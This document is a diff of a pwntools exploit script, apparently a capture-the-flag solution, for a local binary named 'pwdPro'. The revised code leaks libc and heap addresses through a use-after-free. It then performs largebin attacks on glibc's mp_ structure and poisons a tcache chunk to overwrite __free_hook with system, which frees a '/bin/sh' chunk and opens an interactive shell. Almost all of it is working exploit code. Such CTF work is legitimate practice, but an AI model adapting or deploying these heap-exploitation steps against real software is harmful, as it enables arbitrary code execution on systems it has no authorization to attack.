@@ -1,5 +1,4 @@
 from pwn import *
-from pwnlib.term.term import delete
 
 context(os = 'linux', arch = 'amd64', log_level = 'debug')
 io = process('pwdPro')
@@ -44,19 +43,23 @@ def recover(index):
 
 def leak():
     global random_num, heap_base, libc_base
-    random_num = u64(add(0, 'pwd0', 0x440, p64(0) + b'\n', True))       # largebin1
+    random_num = u64(add(0, 'pwd0', 0x440, p64(0) + b'\n', True))       # largebin1 [0x440, 0x480)
     log.success('random_num: ' + hex(random_num))
     add(1, 'pwd1', 0x420, 'aaaa\n')
-    add(1, 'pwd2', 0x430, 'aaaa\n')                                     # largebin2
-    add(2, 'pwd3', 0x888, 'aaaa\n')                                     # fastbin1 for attack
-    add(3, 'pwd4', 0x7f8, 'aaaa\n')                                     # fastbin2 for attack
+    add(1, 'pwd2', 0x430, 'aaaa\n')                                     # largebin2 [0x440, 0x480)
+    add(2, 'pwd3', 0x420, 'aaaa\n')
+    add(2, 'pwd4', 0x480, 'aaaa\n')                                     # largebin3 [0x480, 0x4c0)
+    add(3, 'pwd5', 0x420, 'aaaa\n')
+    add(3, 'pwd6', 0x470, 'aaaa\n')                                     # largebin4 [0x480, 0x4c0)
+    add(4, 'pwd7', 0x420, 'aaaa\n')
+    add(5, 'pwd8', 0x420, 'aaaa\n')
     delete(0)
     recover(0)
     show(0)
     io.recvuntil('\nPwd is: ')
     libc_base = (u64(io.recvn(8)) ^ random_num) - libc.sym['__malloc_hook'] - 0x70
     log.success('libc_base: ' + hex(libc_base))
-    add(4, 'pwd5', 0x450, 'aaaa\n')
+    add(6, 'pwd9', 0x450, 'aaaa\n')
     show(0)
     io.recvuntil('\nPwd is: ')
     heap_base = (u64(io.recvn(0x18)[-8:]) ^ random_num) - 0x290
@@ -64,31 +67,34 @@ def leak():
 
 
 def largebin_attack():
-    global_max_fast = libc_base + libc.sym['__free_hook'] + 0x58
-    log.success('global_max_fast: ' + hex(global_max_fast))
-    delete(1)
-    payload = p64(libc_base + libc.sym['__malloc_hook'] + 0x470) * 2
-    payload += p64(heap_base + 0x290) + p64(global_max_fast - 0x20)
+    mp_ = libc_base + libc.sym['__malloc_hook'] - 0x8f0
+    __free_hook = libc_base + libc.sym['__free_hook']
+    system = libc_base + libc.sym['system']
+    log.success('mp_: ' + hex(mp_))
+    
+    payload = p64(libc_base + libc.sym['__malloc_hook'] + 0x470) * 2 + p64(heap_base + 0x290) + p64(mp_ + 0x50 - 0x20)
     edit(0, payload)
-    add(4, 'pwd6', 0x450, 'aaaa\n')
     delete(2)
     recover(2)
-    edit(2, p64(0x803) + b'\n')
-    add(2, 'pwd3', 0x888, 'aaaa\n')
-
+    add(6, 'pwd10', 0x490, 'aaaa\n')
+    payload = p64(libc_base + libc.sym['__malloc_hook'] + 0x480) * 2 + p64(heap_base + 0x1380) + p64(mp_ + 0x58 - 0x20)
+    edit(2, payload)
+    delete(1)
     delete(3)
-    recover(3)
-    edit(3, p64(libc_base + libc.sym['__malloc_hook'] + 0x450) + b'\n')
-    add(3, 'pwd4', 0x7f8, 'aaaa\n')
-    # add(4, 'fake_chunk', 0x7f8, p64(random_num) + b'\n')
+    add(6, 'pwd11', 0x490, p64(0x0068732f6e69622f ^ random_num) + b'\n')
 
-    # io.recv()
-    # delete(3)
-    # recover(3)
-    # edit(3, p64(libc_base + libc.sym['__malloc_hook'] + 0x450) + b'\n')
-    # add(3, 'pwd4', 0x7f8, 'aaaa\n')
-    gdb.attach(io)
-    pause()
+    delete(5)
+    delete(4)
+    recover(4)
+    edit(4, p64(__free_hook))
+    add(4, 'pwd7', 0x420, 'aaaa\n')
+    # '/bin/sh\x00' = 0x0068732f6e69622f
+    add(5, 'fake_chunk', 0x420, p64(system ^ random_num) + b'\n')
+    # gdb.attach(io)
+    
+    delete(6)
+    # pause()
+    io.interactive()
 
 
 if __name__ == '__main__':
